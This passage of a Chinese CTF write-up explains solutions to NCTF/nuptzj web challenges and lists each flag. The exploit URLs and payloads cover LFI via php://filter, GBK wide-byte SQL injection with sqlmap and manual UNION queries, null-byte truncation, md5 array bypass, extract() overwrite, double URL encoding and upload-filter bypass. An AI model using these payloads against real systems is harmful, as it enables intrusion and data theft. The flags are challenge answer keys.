href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php</a></em> ，将得到的字符串base64解码。</p><h4 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a><a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">单身一百年也没用</a></h4><p><em>nctf{this_is302redirect}</em></p><p>flag藏在响应头中。</p><h4 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a><a href="http://way.nuptzj.cn/web6/" target="_blank" rel="noopener">Download~!</a></h4><p><em>nctf{download_any_file_666}</em></p><p>访问 <em><a href="http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name" target="_blank" rel="noopener">http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name</a></em> 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。</p><h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a><a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">COOKIE</a></h4><p><em>nctf{cookie_is_different_from_session}</em></p><p>看到响应头中有<code>Set-Cookie: Login=0</code>，因此在请求头加入<code>Cookie: Login=1</code>即可。</p><h4 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a><a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">MYSQL</a></h4><p><em>nctf{query_in_mysql}</em></p><p>根据提示查看robots.txt，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TIP:sql.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])</code>为1024而<code>$_GET[id]==1024</code>为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把<code>e</code>当作科学计数法的一部分处理，所以可以提交<code>id=1024e1</code>等，如访问<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024e1</code>。</p><blockquote><p> 1、robots.txt可能藏有提示</p><p> 2、<code>int intval ( mixed $var [, int $base = 10 ] )</code>只取<code>/\d*/</code>的部分。</p></blockquote><h4 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">sql injection 3</a></h4><p><em>nctf{gbk_3sqli}</em></p><p>分别访问<code>id=2</code>和<code>id=3</code>得到提示<code>gbk_sql_injection</code>和<code>the fourth table</code>，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6&apos;&quot; -T ctf4 -C flag --dump</span><br></pre></td></tr></table></figure><p>也可以手注：</p><h5 id="步骤一：确认该点存在注入"><a href="#步骤一：确认该点存在注入" class="headerlink" title="步骤一：确认该点存在注入"></a>步骤一：确认该点存在注入</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2  和</span></span><br><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ </span></span><br><span class="line">返回结果相同。</span><br><span class="line">由于MySQL执行查询时会跳过畸形字符，而 id=<span class="number">2</span>%d6%<span class="number">27</span>--+  经过转义变为id=<span class="number">2</span>%d6%<span class="number">5</span>c%<span class="number">27</span>--+ ，</span><br><span class="line">其中%d6%<span class="number">5</span>c被合在一起解释，也就是id = <span class="string">'2Ö'</span>-- 效果等价于 id = <span class="string">'2'</span>--，但我们获得了执行sql的机会。</span><br></pre></td></tr></table></figure><h5 id="步骤二：查询数据库名"><a href="#步骤二：查询数据库名" class="headerlink" title="步骤二：查询数据库名"></a>步骤二：查询数据库名</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现支持union查询 ，</span><br><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ </span></span><br><span class="line">，之所以要加<span class="keyword">and</span>+<span class="number">0</span>+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为<span class="string">'sae-chinalover'</span>。</span><br></pre></td></tr></table></figure><h5 id="步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字"><a href="#步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字" class="headerlink" title="步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字"></a>步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+</span></span><br><span class="line">得到目前的数据库含有<span class="number">5</span>张表</span><br><span class="line">http:<span class="comment">//chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+</span></span><br><span class="line">得到第四张表表名为<span class="string">'ctf4'</span></span><br><span class="line">MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。</span><br><span class="line">limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。</span><br></pre></td></tr></table></figure><h5 id="步骤四：查询表’ctf4’中的flag"><a href="#步骤四：查询表’ctf4’中的flag" class="headerlink" title="步骤四：查询表’ctf4’中的flag"></a>步骤四：查询表’ctf4’中的flag</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+<span class="keyword">select</span>+<span class="literal">null</span>,<span class="keyword">count</span>(*)+<span class="keyword">from</span>+ctf4<span class="comment">--+</span></span><br><span class="line">发现该表只有一条记录</span><br><span class="line"><span class="keyword">http</span>://chinalover.sinaapp.com/<span class="keyword">SQL</span>-GBK/index.php?<span class="keyword">id</span>=<span class="number">2</span>%d6<span class="string">'+and+0+union+select+null,flag+from+ctf4--+</span></span><br><span class="line"><span class="string">猜测列名为flag，查询得到flag</span></span><br></pre></td></tr></table></figure><p>附一个<a href="https://dev.mysql.com/doc/refman/5.7/en/select.html" target="_blank" rel="noopener">select查询语法</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [ALL | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">      [<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">      [<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">      [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span></span><br><span class="line">        [<span class="built_in">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br><span class="line">      | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure><h4 id="x00"><a href="#x00" class="headerlink" title="/x00"></a><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">/x00</a></h4><p><em>nctf{use00to_jieduan}</em></p><p>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到<code>#biubiubiu</code> ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交<code>nctf=1%00%23biubiubiu</code>即可。</p><p><a href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/boston-key-party/bringham-circle.md" target="_blank" rel="noopener">参考资料</a></p><p>由于在PHP中<a href="http://php.net/manual/en/language.types.string.php#language.types.string.details" target="_blank" rel="noopener">string</a>的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊<a href="https://www.google.com/search?q=%22not+binary+safe%22+or+%22not+binary-safe%22+site%3Aphp.net%2Fmanual%2Fen%2F" target="_blank" rel="noopener">搜</a>了一下发现还有这么一些函数：</p><ul><li>int strcoll ( string $str1 , string $str2 )<br>Locale based string comparison  (when current locale is not C or POSIX)</li><li>public array TokyoTyrantTable::get ( mixed $keys )<br>Gets a row from table database. (version&gt;0.3.0)</li><li>public Exception::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )<br>Construct the exception 。其中对message的处理是非二进制安全的。</li><li>public Error::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )<br>Construct the error object 。其中对message的处理是非二进制安全的。</li><li>bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )<br>Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.)</li><li>bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )<br>Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。</li><li>bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )<br>Attaches a vendor specific string attribute 。$value是非二进制安全的。</li><li>string addcslashes ( string $str , string $charlist )   （存疑，似乎并不是）<br>Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter.  </li><li>array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）<br>Read entire gz-file into an array </li><li>还有这些</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=$_REQUEST[<span class="string">'a'</span>]; <span class="comment">//   http://localhost/test.php?a=asd%00asdf</span></span><br><span class="line">$p=<span class="string">'asdf'</span>;</span><br><span class="line">var_dump(ereg_replace($p,<span class="string">'abcc'</span>,$s)); <span class="comment">//string(3) "asd" </span></span><br><span class="line">var_dump(eregi_replace($p,<span class="string">'abcc'</span>,$s));<span class="comment">//string(3) "asd" </span></span><br><span class="line">var_dump(ereg($p,$s));<span class="comment">//bool(false) </span></span><br><span class="line">var_dump(eregi($p,$s));<span class="comment">//bool(false) </span></span><br><span class="line">var_dump(split($p,$s));<span class="comment">//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; </span></span><br><span class="line">var_dump(split($p,$s));<span class="comment">//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; </span></span><br><span class="line">var_dump(sql_regcase($s)); <span class="comment">//看起来没问题啊。。。string(29) "[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]" </span></span><br><span class="line"><span class="comment">// ereg_replace — Replace regular expression</span></span><br><span class="line"><span class="comment">// ereg — Regular expression match</span></span><br><span class="line"><span class="comment">// eregi_replace — Replace regular expression case insensitive</span></span><br><span class="line"><span class="comment">// eregi — Case insensitive regular expression match</span></span><br><span class="line"><span class="comment">// split — Split string into array by regular expression</span></span><br><span class="line"><span class="comment">// spliti — Split string into array by regular expression case insensitive</span></span><br><span class="line"><span class="comment">// sql_regcase — Make regular expression for case insensitive match</span></span><br></pre></td></tr></table></figure><h4 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a><a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">bypass again</a></h4><p><em>nctf{php_is_so_cool}</em></p><p>访问得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即<code>var_dump(md5(array(2))===null);</code>值为<code>bool(true)</code> ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 <em><a href="http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1</a></em> </p><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a><a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">变量覆盖</a></h4><p><em>nctf{bian_liang_fu_gai!}</em></p><p>source.php核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">                        extract($_POST);</span><br><span class="line">                        <span class="keyword">if</span> ($pass == $thepassword_123)</span><br><span class="line">                          <span class="keyword">echo</span> $theflag;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>extract()函数原型为<code>int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]])</code> ，从数组中将变量导入当前符号表，<code>$extract_type</code>缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。</p><h4 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a><a href="http://way.nuptzj.cn/php/index.php" target="_blank" rel="noopener">PHP是世界上最好的语言</a></h4><p><em>nctf{php_is_best_language}</em></p><p>index.txt核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网页会拒绝任何含有<code>hackerDJ</code>的提交(忽略大小写)，但接受urldecode后为<code>hackerDJ</code>的字符串，所以按照<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">对照表</a>编码，并将<code>%</code>编码为<code>%25</code>后提交，自动解码一次后<code>%25</code>变为<code>%</code>,代码中再解码一次后便得到flag。即访问 <em><a href="http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a" target="_blank" rel="noopener">http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a</a></em>  这是个二次编码的问题。</p><h4 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h4><blockquote><p>这是一个到处都有着伪装的世界<br>题目地址：<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">点我</a></p></blockquote><p> <em>nctf{happy_http_headers}</em> </p><p>referer改了没用，据说请求头添加<code>X-Forwarded-For: 127.0.0.1</code>即可，没有成功，怀疑服务端代码有问题，可能是和<code>你从哪里来</code>那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。</p><h4 id="header"><a href="#header" class="headerlink" title="header"></a><a href="http://way.nuptzj.cn/web5/" target="_blank" rel="noopener">header</a></h4><p><em>nctf{tips_often_hide_here}</em></p><p>使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。</p><h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><blockquote><p>题目地址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">猜猜代码怎么写的</a></p></blockquote><p><em>nctf{welcome_to_hacks_world}</em></p><p>当filename为1.jpg时返回如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .jpg</span><br><span class="line">    [1] =&gt; jpg</span><br><span class="line">)</span><br><span class="line">Upload: 1.jpg<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Type: text/plain<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Size: 0.0078125 Kb<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123;</span><br><span class="line">  ["dirname"]=&gt;</span><br><span class="line">  string(9) "./uploads"</span><br><span class="line">  ["basename"]=&gt;</span><br><span class="line">  string(5) "1.jpg"</span><br><span class="line">  ["extension"]=&gt;</span><br><span class="line">  string(3) "jpg"</span><br><span class="line">  ["filename"]=&gt;</span><br><span class="line">  string(1) "1"</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span>必须上传成后缀名为php的文件才行啊！<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当filename为1.php时返回如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; .php</span><br><span class="line">    [1] =&gt; php</span><br><span class="line">)</span><br><span class="line">不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件</span><br></pre></td></tr></table></figure><p>观察源码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改</p><p><code>/uploads/</code>为<code>/uploads/1.php0x00</code>，然后file保持<code>1.jpg</code>，连起来后就是<code>/uploads/1.php%001.jpg</code>，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。）</p><h4 id="sql注入1"><a href="#sql注入1" class="headerlink" title="sql注入1"></a>sql注入1</h4><blockquote><p>听说你也会注入？<br>地址： <a href="http://chinalover.sinaapp.com/index.php" target="_blank" rel="noopener">题目地址</a></p></blockquote><p><em>nctf{ni_ye_hui_sql?}</em></p><p>在 <em><a href="http://chinalover.sinaapp.com/index.phps" target="_blank" rel="noopener">http://chinalover.sinaapp.com/index.phps</a></em>  查看源码，核心部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not 